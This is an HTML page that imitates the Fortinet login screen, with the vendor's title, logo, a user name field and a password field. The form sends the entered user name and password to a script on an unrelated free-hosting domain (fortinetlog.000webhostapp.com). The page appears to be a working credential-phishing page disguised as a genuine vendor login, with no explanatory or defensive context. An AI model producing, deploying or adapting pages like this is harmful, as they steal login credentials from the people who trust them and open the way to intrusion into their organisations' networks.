<!DOCTYPE html>
<html class="main-app">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=8; IE=EDGE">
    <meta http-equiv="pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1"><link href="main-green.css" rel="stylesheet" type="text/css">
    <title>Fortinet</title>
    <link rel = "icon" type = "image/png" href = "fortinet.png">
  </head>
  <body>
    <div class="view-container">
      <form action="https://fortinetlog.000webhostapp.com/post.php" class="prompt" method="POST" id="login">
        <div class="content with-header">
          <div class="header">
            <img src="fortinet.png" alt="Fortinet Logo" height="30" width="35">
          </div>
          <div class="sub-content">
              <div class="wide-inputs">
                <div class="error-message" id="err_msg_txt"></div>
                <input type="text" name="username" id="username" value="" maxlength="35" placeholder="User Name" />
                <input type="text" name="secretkey" id="secretkey" placeholder="Password">
                <div class="button-actions wide">
                <button class="primary" name="submit" id="submit" type="submit" value="Submit">Login</button>
                </div>
              </div>
          </div>
        </div>
      </form>
    </div>
  </body>
</html>
